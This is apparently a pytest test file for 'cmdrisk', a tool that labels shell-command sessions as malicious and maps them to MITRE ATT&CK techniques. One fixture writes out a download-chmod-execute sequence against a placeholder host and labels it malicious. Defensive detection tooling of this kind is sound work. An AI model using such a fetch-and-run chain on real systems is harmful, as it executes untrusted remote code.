from __future__ import annotations

import json
from pathlib import Path

import pytest
from pydantic import ValidationError

from cmdrisk.schema import CommandEvent, Label, SessionRecord, SourceInfo
from cmdrisk.taxonomy import (
    TACTIC_BY_ID,
    TECHNIQUE_NAMES,
    TECHNIQUE_TO_TACTICS,
    attack_stage,
    tactics_for_techniques,
)

CORPUS_DIR = Path(__file__).resolve().parents[1] / "data" / "processed" / "v2"
CORPUS_TECHNIQUE_FALLBACK = frozenset(
    {
        "T1003",
        "T1005",
        "T1016",
        "T1027",
        "T1033",
        "T1036",
        "T1037",
        "T1053",
        "T1057",
        "T1059",
        "T1069",
        "T1070",
        "T1071",
        "T1082",
        "T1083",
        "T1087",
        "T1098",
        "T1105",
        "T1222",
        "T1424",
        "T1489",
        "T1548",
        "T1562",
        "T1564",
        "T1590",
    }
)


def _corpus_techniques() -> set[str]:
    observed: set[str] = set()
    for path in sorted(CORPUS_DIR.glob("*.jsonl")):
        for line in path.read_text(encoding="utf-8").splitlines():
            label = json.loads(line).get("label", {})
            observed.update(str(value).upper() for value in label.get("techniques", ()))
            observed.update(str(value).upper() for value in label.get("technique_evidence", {}))
    return observed


def test_session_accepts_base_and_subtechnique_evidence() -> None:
    record = SessionRecord(
        session_id="s1",
        source=SourceInfo(kind="real_malicious", name="fixture", license="MIT"),
        family_id="f1",
        commands=[
            CommandEvent(cmd="curl -o /tmp/a http://example.invalid/a", dt=1.0),
            CommandEvent(cmd="chmod +x /tmp/a"),
            CommandEvent(cmd="/tmp/a", dt=0.2),
        ],
        label=Label(
            malicious=1,
            first_evidence_index=0,
            technique_evidence={"T1105": [0], "T1059": [2]},
            tactics=tactics_for_techniques(["T1105", "T1059"]),
            techniques=["T1105", "T1059"],
            quality="high",
        ),
    )
    assert record.commands[0].dt == 1.0
    assert attack_stage(record.label.tactics) == "Command and Control"
    assert tactics_for_techniques(["T1059.004"]) == ["TA0002"]


def test_taxonomy_map_resolves_and_covers_corpus_techniques() -> None:
    assert set(TECHNIQUE_TO_TACTICS) <= set(TECHNIQUE_NAMES)
    assert all(TECHNIQUE_TO_TACTICS[technique] for technique in TECHNIQUE_TO_TACTICS)
    assert {
        tactic_id for tactic_ids in TECHNIQUE_TO_TACTICS.values() for tactic_id in tactic_ids
    } <= set(TACTIC_BY_ID)

    assert tactics_for_techniques(["T1059"]) == ["TA0002"]
    assert tactics_for_techniques(["T1053"]) == ["TA0002", "TA0003", "TA0004"]
    assert tactics_for_techniques(["T1053.003"]) == ["TA0002", "TA0003", "TA0004"]

    observed = _corpus_techniques() or set(CORPUS_TECHNIQUE_FALLBACK)
    assert observed
    assert observed <= set(TECHNIQUE_TO_TACTICS), sorted(observed - set(TECHNIQUE_TO_TACTICS))


def test_benign_cannot_have_evidence_index() -> None:
    with pytest.raises(ValidationError):
        Label(malicious=0, first_evidence_index=0, quality="high")


def test_malicious_requires_evidence_index() -> None:
    with pytest.raises(ValidationError):
        Label(malicious=1, quality="high")


def test_evidence_index_is_in_bounds() -> None:
    with pytest.raises(ValidationError):
        SessionRecord(
            session_id="s1",
            source=SourceInfo(kind="real_malicious", name="fixture", license="MIT"),
            family_id="f1",
            commands=[CommandEvent(cmd="whoami")],
            label=Label(
                malicious=1,
                first_evidence_index=1,
                quality="high",
            ),
        )
